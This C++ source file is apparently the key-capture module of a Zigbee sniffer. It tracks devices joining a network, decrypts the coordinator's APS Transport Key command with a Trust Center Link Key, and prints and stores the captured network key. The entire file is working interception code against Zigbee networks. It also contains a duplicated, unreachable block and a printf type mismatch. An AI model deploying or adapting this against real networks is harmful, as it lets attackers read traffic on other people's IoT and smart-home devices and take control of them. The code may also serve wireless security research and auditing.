/*
 * ZbKeyCapture.cpp - Zigbee Network Key interception
 *
 * The Transport Key command is sent by the coordinator to the joining device
 * encrypted at the APS layer using the Trust Center Link Key (TCLK).
 * The NWK security bit may or may not be set - we handle both cases.
 *
 * APS AUX security header layout (Zigbee spec 4.4.1):
 *   sec_ctrl (1) | frame_counter (4) | [ext_src (8, if bit6 of sec_ctrl)] | key_seq (1)
 *
 * CCM* nonce (13 bytes, Zigbee spec 4.5.1):
 *   src EUI64 (8, LE) | frame_counter (4, LE) | sec_ctrl (1)
 *
 * AAD = NWK payload bytes from offset 0 up to (but not including) APS ciphertext
 *       i.e. NWK header + APS FC byte + APS AUX header
 */

#include "ZbKeyCapture.h"
#include "mbedtls/ccm.h"

extern uint8_t Verbose;

#define APS_CMD_TRANSPORT_KEY   0x05
#define APS_KEY_TYPE_NWK        0x01
#define ZB_MIC_LEN              4

ZbKeyCapture::ZbKeyCapture(IEEE802154Sniffer &sniffer)
    : _sniffer(sniffer), _coordinatorEUI64(0), onKeyCapture(nullptr)
{
    memset(_joins, 0, sizeof(_joins));
}

// -- Public -------------------------------------------------------------------

bool ZbKeyCapture::processFrame(const FrameInfo &info,
                                 const uint8_t *rawPayload, uint8_t rawLen,
                                 uint8_t macPayloadOffset) {

    log_d("ZbKeyCapture::processFrame");
    // Capture coordinator EUI64 whenever we see it
    if (info.srcExtended != 0 && info.macSrc == 0x0000) {
        _coordinatorEUI64 = info.srcExtended;
        }


    if (info.frameType == FC_FRAME_TYPE_MAC_CMD) {
        uint8_t cmdId = (macPayloadOffset < rawLen) ? rawPayload[macPayloadOffset] : 0xFF;
        Serial.printf("[KC] MAC CMD rawLen=%u offset=%u cmd=0x%02X macSrc=0x%04X\n",
                      rawLen, macPayloadOffset, cmdId, info.macSrc);
        if (cmdId == 0x02)
            _handleAssocResponse(info);
        return false;
    }


  if (info.protocol == FrameProtocol::ZIGBEE &&
      info.frameType == FC_FRAME_TYPE_DATA) {
      Serial.printf("[KC] data frame nwkDst=0x%04X nwkSrc=0x%04X bcast=%d\n",
                    info.route.nwkDst, info.route.nwkSrc, is_bcast(info.route.nwkDst));
      if (!is_bcast(info.route.nwkDst))
          return _handleTransportKey(info, rawPayload, rawLen);
  }

    // Zigbee data frames - look for Transport Key regardless of NWK security bit
    if (info.protocol == FrameProtocol::ZIGBEE &&
        info.frameType == FC_FRAME_TYPE_DATA) {
        if (!is_bcast(info.route.nwkDst))
            return _handleTransportKey(info, rawPayload, rawLen);
    }

    return false;
}

void ZbKeyCapture::expireJoins(uint32_t timeout_ms) {
    uint32_t now = millis();
    for (int i = 0; i < MAX_PENDING_JOINS; i++) {
        if (_joins[i].active &&
            (now - _joins[i].assocTime_ms) > timeout_ms) {
            Serial.printf("[KeyCapture] Join timeout for 0x%04X\n",
                          _joins[i].shortAddr);
            _joins[i].active = false;
        }
    }
}

// -- Join state ---------------------------------------------------------------

JoinState *ZbKeyCapture::_findJoin(uint16_t addr) {
    for (int i = 0; i < MAX_PENDING_JOINS; i++)
        if (_joins[i].active && _joins[i].shortAddr == addr) return &_joins[i];
    return nullptr;
}

JoinState *ZbKeyCapture::_allocJoin(uint16_t addr) {
    for (int i = 0; i < MAX_PENDING_JOINS; i++) {
        if (!_joins[i].active) {
            _joins[i].active       = true;
            _joins[i].shortAddr    = addr;
            _joins[i].extAddr      = 0;
            _joins[i].assocTime_ms = millis();
            return &_joins[i];
        }
    }
    JoinState *oldest = &_joins[0];
    for (int i = 1; i < MAX_PENDING_JOINS; i++)
        if (_joins[i].assocTime_ms < oldest->assocTime_ms)
            oldest = &_joins[i];
    oldest->active       = true;
    oldest->shortAddr    = addr;
    oldest->extAddr      = 0;
    oldest->assocTime_ms = millis();
    return oldest;
}

void ZbKeyCapture::_freeJoin(JoinState *j) {
    if (j) j->active = false;
}

// -- Association Response -----------------------------------------------------

void ZbKeyCapture::_handleAssocResponse(const FrameInfo &info) {
    // Coordinator may relay via router - accept if either MAC or NWK src is coordinator
    if (info.macSrc != 0x0000 && info.route.nwkSrc != 0x0000) return;

    uint16_t newDevAddr = info.macDst;

    // Check if we already have this join by extended addr
    if (info.dstExtended != 0) {
        for (int i = 0; i < MAX_PENDING_JOINS; i++) {
            if (_joins[i].active && _joins[i].extAddr == info.dstExtended) {
                // Already tracked via beacon/assoc request - just update short addr
                if (_joins[i].shortAddr == 0xFFFE || _joins[i].shortAddr == newDevAddr) {
                    _joins[i].shortAddr = newDevAddr;
                    Serial.printf("[KeyCapture] Resolved join: EUI64=%016llX → 0x%04X\n",
                                  info.dstExtended, newDevAddr);
                    return;
                }
            }
        }
    }

    JoinState *j = _allocJoin(newDevAddr);
    j->extAddr = info.dstExtended;
    Serial.printf("[KeyCapture] Join detected: 0x%04X (EUI64: %016llX)\n",
                  newDevAddr, info.dstExtended);
}

// -- Transport Key handler ----------------------------------------------------

bool ZbKeyCapture::_handleTransportKey(const FrameInfo &info,
                                        const uint8_t *nwkPayload,
                                        uint8_t nwkLen) {
    // Must be destined for a recently-joined device
    JoinState *j = _findJoin(info.route.nwkDst);

    // Fallback: if nwkDst didn't match (indirect routing via parent router),
    // and frame originates from coordinator, try any active join
    if (!j && info.route.nwkSrc == 0x0000) {
        for (int i = 0; i < MAX_PENDING_JOINS; i++) {
            if (_joins[i].active) { j = &_joins[i]; break; }
        }
    }
    if (!j) return false;

    // Find start of APS layer (skip NWK header)
    uint8_t apsOffset = 0;
    if (!_skipNwkHeader(nwkPayload, nwkLen, apsOffset)) return false;
    if (apsOffset >= nwkLen) return false;

    uint8_t apsFc = nwkPayload[apsOffset];
    uint8_t apsFrameType = apsFc & 0x03;
    bool    apsSecured   = (apsFc >> 5) & 0x01;

    Serial.printf("[KC] Transport Key candidate: nwkLen=%u nwkSrc=0x%04X dst=0x%04X\n",
                  nwkLen, info.route.nwkSrc, info.route.nwkDst);
    Serial.printf("[KC] NWK: ");
    for (int i = 0; i < nwkLen && i < 32; i++) Serial.printf("%02X ", nwkPayload[i]);
    Serial.println();
    Serial.printf("[KC] apsOffset=%u\n", apsOffset);
    Serial.printf("[KC] APS FC=0x%02X type=%u secured=%u\n",
                  apsFc, apsFrameType, apsSecured);

    // We expect APS command frame (type=1)
    if (apsFrameType != 0x01) return false;

    // Get coordinator EUI64 for nonce fallback
    uint64_t coordEUI64 = _coordinatorEUI64;
    if (coordEUI64 == 0) {
        HostRecord *coord = _sniffer.findHost(0x0000);
        if (coord) coordEUI64 = coord->extAddr;
    }

    if (apsSecured) {
        // APS-layer encrypted: try each TCLK
        for (int ki = 0; ki < _sniffer.keys.size(); ki++) {
            ZbKey *k = _sniffer.keys.get(ki);
            if (k->type != ZbKeyType::TRUST_CENTER_LINK) continue;

            uint8_t plaintext[96] = {};
            uint8_t plaintextLen  = 0;

            Serial.printf("[KC] coordEUI64=%016llX\n", coordEUI64);
            {
                uint8_t *eu = (uint8_t*)&coordEUI64;
                Serial.printf("[KC] EUI64 bytes: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X\n",
                    eu[0],eu[1],eu[2],eu[3],eu[4],eu[5],eu[6],eu[7]);
            }

            bool ok = _decryptApsPayload(nwkPayload, nwkLen, apsOffset,
                                          k->key, coordEUI64,
                                          plaintext, plaintextLen);
            if (!ok) continue;

            uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
            uint8_t keySeqNum = 0;
            if (!_parseTransportKey(plaintext, plaintextLen, networkKey, keySeqNum))
                continue;

            Serial.printf("[KeyCapture] *** Network key captured! seq=%u ***\n", keySeqNum);
            Serial.print("[KeyCapture] Key: ");
            for (int i = 0; i < ZIGBEE_KEY_LEN; i++)
                Serial.printf("%02X%s", networkKey[i], i < ZIGBEE_KEY_LEN-1 ? ":" : "\n");

            char label[16];
            snprintf(label, sizeof(label), "NWK-seq%u", keySeqNum);
            _sniffer.addKey(ZbKeyType::NETWORK, networkKey, keySeqNum, label);
            _freeJoin(j);
            if (onKeyCapture) {
                ZbKey *captured = _sniffer.findNetworkKey(keySeqNum);
                if (captured) onKeyCapture(*captured);
            }
            return true;
        }
        Serial.printf("[KC] Decrypt failed for 0x%04X\n", info.route.nwkDst);

    } else {
        // APS not secured - plaintext APS payload (secLevel 0 or 1 in NWK AUX)
        // Skip NWK AUX header to get to APS command
        uint8_t auxOff = apsOffset + 1; // skip APS FC
        if (auxOff + 6 > nwkLen) return false;

        uint8_t auxSecCtrl = nwkPayload[auxOff];
        uint8_t secLevel   = auxSecCtrl & 0x07;
        bool    hasExtSrc  = (auxSecCtrl >> 6) & 0x01;
        uint8_t auxLen     = 6; // secCtrl(1)+fc(4)+keySeq(1)
        if (hasExtSrc) auxLen += 8;

        uint8_t apsPayloadOff = apsOffset + 1 + auxLen;
        Serial.printf("[KC] secLevel=%u — plaintext APS, apsPayloadOff=%u\n",
                      secLevel, apsPayloadOff);

        if (apsPayloadOff >= nwkLen) return false;

        uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
        uint8_t keySeqNum = 0;
        if (!_parseTransportKey(&nwkPayload[apsPayloadOff],
                                 nwkLen - apsPayloadOff,
                                 networkKey, keySeqNum)) return false;

        Serial.printf("[KeyCapture] *** Network key captured (plaintext)! seq=%u ***\n", keySeqNum);
        Serial.print("[KeyCapture] Key: ");
        for (int i = 0; i < ZIGBEE_KEY_LEN; i++)
            Serial.printf("%02X%s", networkKey[i], i < ZIGBEE_KEY_LEN-1 ? ":" : "\n");

        char label[16];
        snprintf(label, sizeof(label), "NWK-seq%u", keySeqNum);
        _sniffer.addKey(ZbKeyType::NETWORK, networkKey, keySeqNum, label);
        _freeJoin(j);
        if (onKeyCapture) {
            ZbKey *captured = _sniffer.findNetworkKey(keySeqNum);
            if (captured) onKeyCapture(*captured);
        }
        return true;
    }

    return false;
}

// -- Skip NWK header ----------------------------------------------------------

bool ZbKeyCapture::_skipNwkHeader(const uint8_t *p, uint8_t len,
                                   uint8_t &apsOffset) {
    if (len < 8) return false;

    uint16_t nwkFc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
    uint8_t off = 8; // FC(2)+dst(2)+src(2)+radius(1)+seq(1)

    // Optional multicast control
    if ((nwkFc >> 8) & 0x01) { if (off + 1 > len) return false; off++; }

    // Optional extended destination
    if (nwkFc & ZB_NWK_FC_EXT_DST) { if (off + 8 > len) return false; off += 8; }

    // Optional extended source
    if (nwkFc & ZB_NWK_FC_EXT_SRC) { if (off + 8 > len) return false; off += 8; }

    // Source route subframe
    if (nwkFc & ZB_NWK_FC_SOURCE_ROUTE) {
        if (off + 2 > len) return false;
        uint8_t relayCount = p[off];
        off += 2 + relayCount * 2;
        if (off > len) return false;
    }

    // NWK AUX security header (if NWK security bit set) - skip it entirely
    // to reach the APS layer
    bool nwkSecured = (nwkFc >> 1) & 0x01;
    if (nwkSecured) {
        // AUX: secCtrl(1)+fc(4)+[extSrc(8)]+keySeq(1)
        if (off + 6 > len) return false;
        uint8_t auxSecCtrl = p[off];
        bool hasExtSrc = (auxSecCtrl >> 6) & 0x01;
        off += 6;
        if (hasExtSrc) { if (off + 8 > len) return false; off += 8; }
    }

    apsOffset = off;
    return true;
}


std::array<const String, 8> sec_levels = {
  "No encryption and no MIC (unsecured frame)",
  "No encryption with a 32-bit MIC (authenticity only)",
  "No encryption with a 64-bit MIC (authenticity only)",
  "No encryption with a 128-bit MIC (authenticity only)",
  "AES-CCM encryption with no MIC (encryption only)",
  "AES-CCM encryption with a 32-bit MIC (standard IoT balance)",
  "AES-CCM encryption with a 64-bit MIC",
  "AES-CCM encryption with a 128-bit MIC (maximum security)"
};

// -- Decrypt APS payload (TCLK-encrypted) -------------------------------------

bool ZbKeyCapture::_decryptApsPayload(const uint8_t *nwkPayload, uint8_t nwkLen,
                                       uint8_t apsOffset,
                                       const uint8_t *key,
                                       uint64_t knownExtSrc,
                                       uint8_t *plaintextOut,
                                       uint8_t &plaintextLen) {
    // APS layer: FC(1) + AUX(variable) + ciphertext + MIC(4)
    if (apsOffset + 1 + 6 + ZB_MIC_LEN >= nwkLen) return false;

    // uint8_t apsFc = nwkPayload[apsOffset]; // already checked by caller
    uint8_t auxStart = apsOffset + 1; // AUX begins after APS FC

    const uint8_t *aux = &nwkPayload[auxStart];
    uint8_t remaining  = nwkLen - auxStart;
    if (remaining < 6) return false;

    uint8_t  secCtrl     = aux[0];
    uint32_t frameCounter = (uint32_t)aux[1] | ((uint32_t)aux[2] << 8) |
                             ((uint32_t)aux[3] << 16) | ((uint32_t)aux[4] << 24);
    uint8_t  secLevel    = secCtrl & 0x07;
    bool     hasExtSrc   = (secCtrl >> 6) & 0x01;

    uint8_t auxOff = 5; // past secCtrl + frameCounter
    uint8_t srcEui64[8] = {};

    if (hasExtSrc) {
        if (auxOff + 8 > remaining) return false;
        memcpy(srcEui64, &aux[auxOff], 8);
        auxOff += 8;
    } else {
        // Use coordinator EUI64 passed in (stored as uint64_t, LE in memory)
        memcpy(srcEui64, &knownExtSrc, 8);
    }

    if (auxOff + 1 > remaining) return false;
    auxOff++; // skip keySeq

    uint8_t encStart = auxStart + auxOff;
    if (encStart + ZB_MIC_LEN >= nwkLen) return false;
    uint8_t encLen = nwkLen - encStart - ZB_MIC_LEN;

    const uint8_t *ciphertext = &nwkPayload[encStart];
    const uint8_t *mic        = &nwkPayload[nwkLen - ZB_MIC_LEN];

    // Nonce: srcEUI64(8,LE) | frameCounter(4,LE) | secCtrl(1)
    uint8_t nonce[13];
    memcpy(nonce,     srcEui64, 8);
    memcpy(nonce + 8, &aux[1],  4);
    nonce[12] = secCtrl;

    // AAD: from start of nwkPayload through end of APS AUX header
    // i.e. nwkPayload[0 .. encStart-1]
    const uint8_t *aad    = nwkPayload;
    uint8_t        aadLen = encStart;

    Serial.printf("[KC] nonce: ");
    for (int i = 0; i < 13; i++) Serial.printf("%02X", nonce[i]);
    Serial.printf(" fc=%08lX sc=%02X\n", frameCounter, secCtrl);
    Serial.printf("[KC] encStart=%u encLen=%u aadLen=%u\n", encStart, encLen, aadLen);
    if (Verbose) {
      Serial.printf("    SecLev=%s\n", sec_levels[secCtrl & 0x07]);
    }

    if (encLen == 0 || encLen > 95) return false;

    bool ok = _ccmDecrypt(key, nonce, aad, aadLen,
                           ciphertext, encLen,
                           plaintextOut, mic, ZB_MIC_LEN);
    if (ok) plaintextLen = encLen;
    return ok;
}

// -- AES-128-CCM* decryption --------------------------------------------------

bool ZbKeyCapture::_ccmDecrypt(const uint8_t *key,
                                const uint8_t *nonce,
                                const uint8_t *aad,   uint8_t aadLen,
                                const uint8_t *ct,    uint8_t ctLen,
                                uint8_t       *pt,
                                const uint8_t *mic,   uint8_t micLen) {
    mbedtls_ccm_context ctx;
    mbedtls_ccm_init(&ctx);

    int ret = mbedtls_ccm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key, 128);
    if (ret != 0) { mbedtls_ccm_free(&ctx); return false; }

    ret = mbedtls_ccm_star_auth_decrypt(&ctx,
                                         ctLen,
                                         nonce, 13,
                                         aad, aadLen,
                                         ct, pt,
                                         mic, micLen);
    mbedtls_ccm_free(&ctx);
    return (ret == 0);
}

// -- Parse APS Transport Key --------------------------------------------------

bool ZbKeyCapture::_parseTransportKey(const uint8_t *aps, uint8_t apsLen,
                                       uint8_t *networkKeyOut,
                                       uint8_t &seqNumOut) {
    if (apsLen < 2) return false;

    uint8_t apsFc        = aps[0];
    uint8_t apsFrameType = apsFc & 0x03;

    // APS command frame (type = 0x01)
    if (apsFrameType != 0x01) {
        Serial.printf("[KC] _parseTransportKey: not APS cmd, type=%u\n", apsFrameType);
        return false;
    }

    uint8_t cmdId = aps[1];
    if (cmdId != APS_CMD_TRANSPORT_KEY) {
        Serial.printf("[KC] _parseTransportKey: not Transport Key cmd=0x%02X\n", cmdId);
        return false;
    }

    // Transport Key: FC(1)+cmd(1)+keyType(1)+key(16)+seq(1)+dstEUI(8)+srcEUI(8) = 36B min
    if (apsLen < 36) return false;

    uint8_t keyType = aps[2];
    if (keyType != APS_KEY_TYPE_NWK) {
        Serial.printf("[KC] Transport Key type=0x%02X (not NWK)\n", keyType);
        return false;
    }

    memcpy(networkKeyOut, &aps[3], ZIGBEE_KEY_LEN);
    seqNumOut = aps[3 + ZIGBEE_KEY_LEN];
    return true;
}
